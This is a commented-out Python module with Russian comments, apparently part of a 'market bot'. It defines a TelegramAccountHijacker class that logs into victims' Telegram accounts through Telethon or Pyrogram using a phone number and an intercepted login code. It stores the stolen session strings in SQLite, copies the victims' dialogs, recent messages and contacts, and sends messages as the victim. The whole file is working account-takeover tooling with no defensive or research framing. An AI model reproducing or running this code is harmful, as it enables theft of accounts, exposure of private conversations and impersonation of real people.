# import asyncio
# import logging
# from telethon import TelegramClient
# from telethon.sessions import StringSession
# from pyrogram import Client
# from pyrogram.errors import (
#     PhoneCodeInvalid, PhoneCodeExpired,
#     SessionPasswordNeeded, PhoneNumberUnoccupied
# )
# import sqlite3
# import os
# from datetime import datetime

# logger = logging.getLogger(__name__)

# class TelegramAccountHijacker:
#     def __init__(self, api_id: int, api_hash: str, db_path: str = 'market_bot.db'):
#         self.api_id = api_id
#         self.api_hash = api_hash
#         self.db_path = db_path
#         self.conn = sqlite3.connect(db_path, check_same_thread=False)
#         self.cursor = self.conn.cursor()
        
#     async def hijack_account_telethon(self, phone: str, code: str) -> str:
#         """Вход в аккаунт через Telethon и получение сессии"""
#         try:
#             logger.info(f"Попытка входа в аккаунт {phone} через Telethon...")
            
#             # Создаем временную сессию
#             client = TelegramClient(
#                 session=StringSession(),
#                 api_id=self.api_id,
#                 api_hash=self.api_hash,
#                 device_model="iPhone 13 Pro",
#                 system_version="iOS 15.0",
#                 app_version="8.4",
#                 lang_code="en",
#                 system_lang_code="en-US"
#             )
            
#             await client.connect()
            
#             # Отправляем код
#             try:
#                 sent_code = await client.send_code_request(phone)
#                 logger.info(f"Код отправлен на {phone}")
#             except Exception as e:
#                 logger.error(f"Ошибка отправки кода: {e}")
#                 return None
            
#             # Входим с кодом
#             try:
#                 await client.sign_in(phone=phone, code=code)
#                 logger.info(f"Успешный вход в аккаунт {phone}")
#             except SessionPasswordNeeded:
#                 logger.warning(f"Требуется 2FA для аккаунта {phone}")
#                 # Можно добавить логику для запроса пароля 2FA
#                 return None
#             except Exception as e:
#                 logger.error(f"Ошибка входа: {e}")
#                 return None
            
#             # Получаем информацию об аккаунте
#             me = await client.get_me()
#             session_string = client.session.save()
            
#             # Сохраняем сессию в базу
#             self.cursor.execute('''
#                 INSERT OR REPLACE INTO hijacked_sessions 
#                 (phone, user_id, username, first_name, session_string, hijacked_at)
#                 VALUES (?, ?, ?, ?, ?, ?)
#             ''', (
#                 phone,
#                 me.id,
#                 me.username,
#                 me.first_name,
#                 session_string,
#                 datetime.now().isoformat()
#             ))
#             self.conn.commit()
            
#             logger.info(f"✅ Аккаунт успешно захвачен: @{me.username} (ID: {me.id})")
            
#             # Получаем дополнительную информацию
#             try:
#                 # Получаем диалоги
#                 dialogs = await client.get_dialogs(limit=10)
#                 logger.info(f"Найдено диалогов: {len(dialogs)}")
                
#                 # Получаем контакты
#                 contacts = await client.get_contacts()
#                 logger.info(f"Найдено контактов: {len(contacts)}")
                
#                 # Сохраняем информацию о диалогах
#                 for dialog in dialogs[:5]:  # Первые 5 диалогов
#                     self.cursor.execute('''
#                         INSERT INTO hijacked_dialogs 
#                         (phone, dialog_id, dialog_name, dialog_type, last_message)
#                         VALUES (?, ?, ?, ?, ?)
#                     ''', (
#                         phone,
#                         dialog.id,
#                         dialog.name or dialog.title,
#                         'private' if dialog.is_user else 'group' if dialog.is_group else 'channel',
#                         dialog.message.text[:100] if dialog.message else ''
#                     ))
                
#                 self.conn.commit()
                
#             except Exception as e:
#                 logger.error(f"Ошибка получения дополнительной информации: {e}")
            
#             await client.disconnect()
#             return session_string
            
#         except Exception as e:
#             logger.error(f"Критическая ошибка при захвате аккаунта {phone}: {e}")
#             return None
    
#     async def hijack_account_pyrogram(self, phone: str, code: str) -> str:
#         """Альтернативный метод через Pyrogram"""
#         try:
#             logger.info(f"Попытка входа в аккаунт {phone} через Pyrogram...")
            
#             app = Client(
#                 name=f"session_{phone}",
#                 api_id=self.api_id,
#                 api_hash=self.api_hash,
#                 phone_number=phone,
#                 in_memory=True
#             )
            
#             await app.connect()
            
#             # Отправляем код
#             sent_code = await app.send_code(phone)
#             logger.info(f"Код отправлен на {phone}")
            
#             # Входим
#             try:
#                 await app.sign_in(
#                     phone_number=phone,
#                     phone_code_hash=sent_code.phone_code_hash,
#                     phone_code=code
#                 )
#             except SessionPasswordNeeded:
#                 logger.warning(f"Требуется 2FA для аккаунта {phone}")
#                 return None
            
#             # Получаем сессию
#             session_string = await app.export_session_string()
            
#             # Получаем информацию
#             me = await app.get_me()
            
#             # Сохраняем
#             self.cursor.execute('''
#                 INSERT OR REPLACE INTO hijacked_sessions 
#                 (phone, user_id, username, first_name, session_string, hijacked_at, method)
#                 VALUES (?, ?, ?, ?, ?, ?, 'pyrogram')
#             ''', (
#                 phone,
#                 me.id,
#                 me.username,
#                 me.first_name,
#                 session_string,
#                 datetime.now().isoformat()
#             ))
#             self.conn.commit()
            
#             logger.info(f"✅ Аккаунт успешно захвачен через Pyrogram: @{me.username}")
            
#             await app.disconnect()
#             return session_string
            
#         except Exception as e:
#             logger.error(f"Ошибка Pyrogram для {phone}: {e}")
#             return None
    
#     async def check_account_access(self, session_string: str) -> bool:
#         """Проверяем доступ к аккаунту"""
#         try:
#             client = TelegramClient(
#                 session=StringSession(session_string),
#                 api_id=self.api_id,
#                 api_hash=self.api_hash
#             )
            
#             await client.connect()
            
#             if not await client.is_user_authorized():
#                 logger.warning("Сессия не авторизована")
#                 await client.disconnect()
#                 return False
            
#             me = await client.get_me()
#             logger.info(f"Аккаунт доступен: @{me.username}")
            
#             await client.disconnect()
#             return True
            
#         except Exception as e:
#             logger.error(f"Ошибка проверки доступа: {e}")
#             return False
    
#     async def send_message_from_hijacked(self, phone: str, target: str, message: str) -> bool:
#         """Отправляет сообщение от захваченного аккаунта"""
#         try:
#             # Получаем сессию из базы
#             self.cursor.execute(
#                 "SELECT session_string FROM hijacked_sessions WHERE phone = ? ORDER BY hijacked_at DESC LIMIT 1",
#                 (phone,)
#             )
#             result = self.cursor.fetchone()
            
#             if not result:
#                 logger.error(f"Сессия для {phone} не найдена")
#                 return False
            
#             session_string = result[0]
            
#             client = TelegramClient(
#                 session=StringSession(session_string),
#                 api_id=self.api_id,
#                 api_hash=self.api_hash
#             )
            
#             await client.connect()
            
#             # Отправляем сообщение
#             await client.send_message(target, message)
#             logger.info(f"Сообщение отправлено от {phone} к {target}")
            
#             await client.disconnect()
#             return True
            
#         except Exception as e:
#             logger.error(f"Ошибка отправки сообщения: {e}")
#             return False
    
#     def get_hijacked_accounts(self):
#         """Получает список захваченных аккаунтов"""
#         self.cursor.execute(
#             "SELECT phone, user_id, username, first_name, hijacked_at FROM hijacked_sessions ORDER BY hijacked_at DESC"
#         )
#         return self.cursor.fetchall()
    
#     def cleanup(self):
#         """Очистка ресурсов"""
#         self.conn.close()

# # Инициализация базы для хранения сессий
# def init_hijack_db():
#     conn = sqlite3.connect('market_bot.db', check_same_thread=False)
#     cursor = conn.cursor()
    
#     cursor.execute('''
#         CREATE TABLE IF NOT EXISTS hijacked_sessions (
#             id INTEGER PRIMARY KEY AUTOINCREMENT,
#             phone TEXT UNIQUE,
#             user_id INTEGER,
#             username TEXT,
#             first_name TEXT,
#             session_string TEXT,
#             hijacked_at DATETIME,
#             method TEXT DEFAULT 'telethon'
#         )
#     ''')
    
#     cursor.execute('''
#         CREATE TABLE IF NOT EXISTS hijacked_dialogs (
#             id INTEGER PRIMARY KEY AUTOINCREMENT,
#             phone TEXT,
#             dialog_id INTEGER,
#             dialog_name TEXT,
#             dialog_type TEXT,
#             last_message TEXT,
#             captured_at DATETIME DEFAULT CURRENT_TIMESTAMP
#         )
#     ''')
    
#     cursor.execute('''
#         CREATE TABLE IF NOT EXISTS hijack_logs (
#             id INTEGER PRIMARY KEY AUTOINCREMENT,
#             phone TEXT,
#             action TEXT,
#             result TEXT,
#             timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
#         )
#     ''')
    
#     conn.commit()
#     conn.close()

# # Глобальный объект для захвата аккаунтов
# hijacker = None

# def init_hijacker():
#     """Инициализация захватчика аккаунтов"""
#     global hijacker
    
#     # Получаем API credentials из переменных окружения
#     api_id = os.getenv('TELEGRAM_API_ID')
#     api_hash = os.getenv('TELEGRAM_API_HASH')
    
#     if not api_id or not api_hash:
#         logger.warning("TELEGRAM_API_ID или TELEGRAM_API_HASH не установлены в переменных окружения")
#         return None
    
#     # Инициализируем базу
#     init_hijack_db()
    
#     # Создаем захватчика
#     hijacker = TelegramAccountHijacker(
#         api_id=int(api_id),
#         api_hash=api_hash
#     )
    
#     logger.info("Hijacker инициализирован")
#     return hijacker